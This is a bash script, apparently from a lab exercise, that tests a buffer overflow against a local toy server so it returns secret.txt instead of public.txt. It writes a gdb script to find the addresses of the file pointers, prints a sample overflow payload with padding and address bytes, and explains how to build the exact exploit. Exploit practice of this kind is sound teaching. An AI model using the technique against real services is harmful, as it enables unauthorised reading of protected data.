#!/bin/bash
cd "/Users/jankott/Downloads/bufferoverflow 2/secretfile"

echo "===== TESTING BUFFER OVERFLOW EXPLOIT ====="
echo ""

# Kill any existing server
killall -9 server client 2>/dev/null
sleep 2

# Start server in background
echo "Starting server..."
./server > /tmp/server_test.log 2>&1 &
SERVER_PID=$!
sleep 2

# Check if server started successfully
if ps -p $SERVER_PID > /dev/null; then
    echo "Server started successfully (PID: $SERVER_PID)"
else
    echo "Server failed to start. Log:"
    cat /tmp/server_test.log
    exit 1
fi

echo ""
echo "===== Test 1: Normal message (should get public.txt) ====="
./client localhost "hello"
echo ""

sleep 1

echo "===== Test 2: Buffer overflow exploit (should get secret.txt) ====="
echo "Finding addresses with gdb..."

# Create gdb script to get addresses
cat > /tmp/gdb_script.txt << 'GDEOF'
break handleClientRequest
commands
silent
print &fpub
print &fsec
print fpub
print fsec
continue
end
run &
quit
GDEOF

echo "Note: For the actual exploit, we need to determine the exact addresses using gdb."
echo "The theoretical exploit would be:"
echo "./client localhost aaaabbbbccccddddeeeeffffgggghhhhiiiijjjj\$'\\x20\\x80\\x55\\x55\\x55\\x55\\x00\\x00'"
echo ""
echo "However, the exact address bytes will vary on this system."

# Clean up
kill $SERVER_PID 2>/dev/null
sleep 1

echo ""
echo "To find the correct exploit, run: gdb ./server"
echo "Then use 'break 77', 'run', and in another terminal connect with the client"
echo "Use 'print &fsec' to get the address, then construct the exploit payload"
